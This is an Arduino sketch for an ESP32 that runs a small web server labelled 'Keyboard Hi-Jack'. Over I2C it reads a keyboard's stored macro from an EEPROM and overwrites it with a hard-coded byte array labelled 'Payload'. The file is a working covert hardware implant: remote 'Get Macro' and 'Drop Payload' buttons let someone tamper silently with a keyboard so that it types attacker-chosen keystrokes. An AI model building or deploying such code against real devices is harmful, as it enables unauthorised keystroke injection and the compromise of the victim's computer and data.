// 
//#include <ESP8266WiFi.h>   <- If using the D1 mini
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <Wire.h>
#define chipAddress 80
#ifndef STASSID
// Replace with your network credentials
#define STASSID "Enter AP SSID"
#define STAPSK  "Enter AP Password"
#endif

const char* ssid = STASSID;
const char* password = STAPSK;



// Set web server port number to 80
WiFiServer server(80);

// Variable to store the HTTP request
String header;

// Auxiliar variables to store the current output state
String output26State = "off";
String output27State = "off";

// Assign output variables to GPIO pins
const int output26 = 26; //Just a work around to display values
const int output27 = 27;

// Current time
unsigned long currentTime = millis();
// Previous time
unsigned long previousTime = 0; 
// Define timeout time in milliseconds (example: 2000ms = 2s)
const long timeoutTime = 2000;

void setup() {
  Serial.begin(115200);
  Wire.begin (21, 22);

  // Connect to Wi-Fi network with SSID and password
  Serial.print("Connecting to ");
  Serial.println(ssid);
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  // Print local IP address and start web server
  Serial.println("");
  Serial.println("WiFi connected.");
  Serial.println("IP address: ");
  Serial.println(WiFi.localIP());
  server.begin();
}

// 1st macro Address
 int cellAddress[405] = {2720,2721,2722,2723,2724,2725,2726,2727,2728,2729,2730,2731,2732,2733,2734,2735,
 2736,2737,2738,2739,2740,2741,2742,2743,2744,2745,2746,2747,2748,2749,2750,2751,2752,2753,2754,2755,2756,2757,2758,
 2759,2760,2761,2762,2763,2764,2765,2766,2767,2768,2769,2770,2771,2772,2773,2774,2775,2776,2777,2778,2779,2780,2781,
 2782,2783,2784,2785,2786,2787,2788,2789,2790,2791,2792,2793,2794,2795,2796,2797,2798,2799,2800,2801,2802,2803,2804,
 2805,2806,2807,2808,2809,2810,2811,2812,2813,2814,2815,2816,2817,2818,2819,2820,2821,2822,2823,2824,2825,2826,2827,
 2828,2829,2830,2831,2832,2833,2834,2835,2836,2837,2838,2839,2840,2841,2842,2843,2844,2845,2846,2847,2848,2849,2850,
 2851,2852,2853,2854,2855,2856,2857,2858,2859,2860,2861,2862,2863,2864,2865,2866,2867,2868,2869,2870,2871,2872,2873,
 2874,2875,2876,2877,2878,2879,2880,2881,2882,2883,2884,2885,2886,2887,2888,2889,2890,2891,2892,2893,2894,2895,2896,
 2897,2898,2899,2900,2901,2902,2903,2904,2905,2906,2907,2908,2909,2910,2911,2912,2913,2914,2915,2916,2917,2918,2919,
 2920,2921,2922,2923,2924,2925,2926,2927,2928,2929,2930,2931,2932,2933,2934,2935,2936,2937,2938,2939,2940,2941,2942,
 2943,2944,2945,2946,2947,2948,2949,2950,2951,2952,2953,2954,2955,2956,2957,2958,2959,2960,2961,2962,2963,2964,2965,
 2966,2967,2968,2969,2970,2971,2972,2973,2974,2975,2976,2977,2978,2979,2980,2981,2982,2983,2984,2985,2986,2987,2988,
 2989,2990,2991,2992,2993,2994,2995,2996,2997,2998,2999,3000,3001,3002,3003,3004,3005,3006,3007,3008,3009,3010,3011,
 3012,3013,3014,3015,3016,3017,3018,3019,3020,3021,3022,3023,3024,3025,3026,3027,3028,3029,3030,3031,3032,3033,3034,
 3035,3036,3037,3038,3039,3040,3041,3042,3043,3044,3045,3046,3047,3048,3049,3050,3051,3052,3053,3054,3055,3056,3057,
 3058,3059,3060,3061,3062,3063,3064,3065,3066,3067,3068,3069,3070,3071,3072,3073,3074,3075,3076,3077,3078,3079,3080,
 3081,3082,3083,3084,3085,3086,3087,3088,3089,3090,3091,3092,3093,3094,3095,3096,3097,3098,3099,3100,3101,3102,3103,
 3104,3105,3106,3107,3108,3109,3110,3111,3112,3113,3114,3115,3116,3117,3118,3119,3120,3121,3122,3123,3124};


// Payload
byte cellData[405] = {0,1,0,227,0,21,128,21,128,227,0,16,128,16,128,0,22,128,22,128,0,184,11,128,0,23,128,23,128,0,4,
128,4,128,0,87,128,87,0,25,128,25,128,0,5,128,5,128,0,22,128,22,128,0,6,128,6,128,0,21,128,21,128,0,12,128,12,128,0,
19,128,19,128,0,23,128,23,128,0,51,128,51,128,0,6,128,6,128,0,15,128,15,128,0,18,128,18,128,0,22,128,22,128,0,0,128,
0,128,0,38,128,38,128,0,8,128,8,128,0,27,128,27,128,0,0,128,0,128,0,6,128,6,128,0,24,128,24,128,0,23,128,23,128,0,0,
128,0,128,0,38,128,38,128,0,52,128,52,128,0,10,128,10,128,0,8,128,8,128,0,23,128,23,128,0,18,128,18,128,0,5,128,5,128,
0,216,13,128,0,8,128,8,128,0,6,128,6,128,0,23,128,23,128,0,38,128,38,128,0,52,128,52,128,0,52,128,52,128,0,22,128,22,
128,0,6,128,6,128,0,21,128,21,128,0,200,12,128,0,19,128,19,128,0,23,128,23,128,0,51,128,51,128,0,184,11,128,0,23,128,
23,128,0,23,128,23,128,0,19,128,19,128,0,0,51,128,51,128,0,56,128,56,128,0,56,128,56,128,0,30,128,30,128,0,39,128,39,
128,0,55,128,55,128,0,39,128,39,128,0,55,128,55,128,0,39,128,39,128,0,55,128,55,128,0,30,128,30,128,0,39,128,39,128,0,
56,128,56,128,0,5,128,5,128,0,4,128,4,128,0,7,128,7,128,0,55,128,55,128,0,22,128,22,128,0,6,128,6,128,0,23,128,23,128,
0,52,128,52,128,0,52,128,52,128,0,39,128,39,128,0,52,128,52,128,0,39,128,39,128,0,39,128,39,128,0};


void loop(){
  WiFiClient client = server.available();   // Listen for incoming clients

  if (client) {                             // If a new client connects,
    currentTime = millis();
    previousTime = currentTime;
    Serial.println("New Client.");          // print a message out in the serial port
    String currentLine = "";                // make a String to hold incoming data from the client
    while (client.connected() && currentTime - previousTime <= timeoutTime) {  // loop while the client's connected
      currentTime = millis();
      if (client.available()) {             // if there's bytes to read from the client,
        char c = client.read();             // read a byte, then
        Serial.write(c);                    // print it out the serial monitor
        header += c;
        if (c == '\n') {                    // if the byte is a newline character
          // if the current line is blank, you got two newline characters in a row.
          // that's the end of the client HTTP request, so send a response:
          if (currentLine.length() == 0) {
            // HTTP headers always start with a response code (e.g. HTTP/1.1 200 OK)
            // and a content-type so the client knows what's coming, then a blank line:
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println("Connection: close");
            client.println();
            
            // Get macro from flash 
            if (header.indexOf("GET /26/on") >= 0) {
            client.print ("Reading current macro:\n") ;   
              for (int address = 0; address<405; address ++){
                client.print(readFrom(chipAddress, cellAddress[address]),HEX);
                delay(10);
                client.print(" ");
               }
            
            } else if (header.indexOf("GET /26/off") >= 0) {
              Serial.println("Request Macro");

            } else if (header.indexOf("GET /27/on") >= 0) {
              Serial.println("Writing Payload");
              for (int i = 0; i<405; i++){
                writeTo(chipAddress, cellAddress[i], cellData[i]),HEX;
              }
              
              digitalWrite(output27, HIGH);
            } else if (header.indexOf("GET /27/off") >= 0) {
              Serial.println("GPIO 27 off");
              output27State = "off";
              digitalWrite(output27, LOW);
            }
            
            // Display the HTML web page
            client.println("<!DOCTYPE html><html>");
            client.println("<head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">");
            client.println("<link rel=\"icon\" href=\"data:,\">");
            // CSS to style the buttons 
            // Feel free to change the background-color and font-size attributes to fit your preferences
            client.println("<style>html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center;}");
            client.println(".button { background-color: #4CAF50; border: none; color: white; padding: 16px 40px;");
            client.println("text-decoration: none; font-size: 30px; margin: 2px; cursor: pointer;}");
            client.println(".button2 {background-color: #555555;}</style></head>");
            
            // Web Page Heading
            client.println("<body><h1>Keyboard Hi-Jack</h1>");
            
            // Display Macro Button 
            client.println("<p>Get Macro</p>");
                  
            if (output26State=="off") {
              client.println("<p><a href=\"/26/on\"><button class=\"button\">Get Macro</button></a></p>");
            } else {
              client.println("<p><a href=\"/26/off\"><button class=\"button button2\">Get Macro</button></a></p>");
            } 
               
            // Display Payload Button  
            client.println("<p>Drop Payload</p>");
                 
            if (output27State=="off") {
              client.println("<p><a href=\"/27/on\"><button class=\"button\">Drop Payload</button></a></p>");
            } else {
              client.println("<p><a href=\"/27/off\"><button class=\"button button2\">Drop Payload</button></a></p>");
            }
            client.println("</body></html>");
            
            // The HTTP response ends with another blank line
            client.println();
            // Break out of the while loop
            break;
          } else { // if you got a newline, then clear currentLine
            currentLine = "";
          }
        } else if (c != '\r') {  // if you got anything else but a carriage return character,
          currentLine += c;      // add it to the end of the currentLine
        }
      }
    }
    // Clear the header variable
    header = "";
    // Close the connection
    client.stop();
    Serial.println("Client disconnected.");
    Serial.println("");
  }
}

void writeTo(int chAddress, unsigned int ceAddress, byte wData)
{
  int data = wData;
  Wire.beginTransmission(chAddress);
  Wire.write((int)(ceAddress >> 8)); // MSB
  Wire.write((int)(ceAddress & 0xFF)); // LSB
  Wire.write(wData);
  Wire.endTransmission();
  delay(5);
}

byte readFrom(int chAddress, unsigned int ceAddress){
  byte rdata = 0xFF;
  Wire.beginTransmission(chAddress);
  Wire.write((int)(ceAddress >> 8)); // MSB
  Wire.write((int)(ceAddress & 0xFF)); // LSB
  Wire.endTransmission();
  Wire.requestFrom(chAddress,1);
  if (Wire.available()) rdata = Wire.read();
  return rdata;
}
